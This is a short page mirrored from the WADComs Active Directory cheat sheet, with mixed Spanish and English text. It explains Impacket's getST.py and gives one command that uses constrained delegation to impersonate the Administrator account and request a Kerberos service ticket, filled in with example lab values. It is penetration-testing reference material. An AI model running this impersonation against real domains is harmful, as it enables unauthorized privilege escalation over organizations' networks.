# WADComs: Impacket-getST-Creds

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Username`, `Password`

**Sistema:** `Linux`, `Windows`

## Descripción

Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.

Command Reference:

	Target IP: 10.10.10.1

	Domain: test.local

	Service: www

	Host Name: server01.test.local

	Username: john

	Password: password123

	Impersonated User: Administrator

## Comando

```bash
python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py
- http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
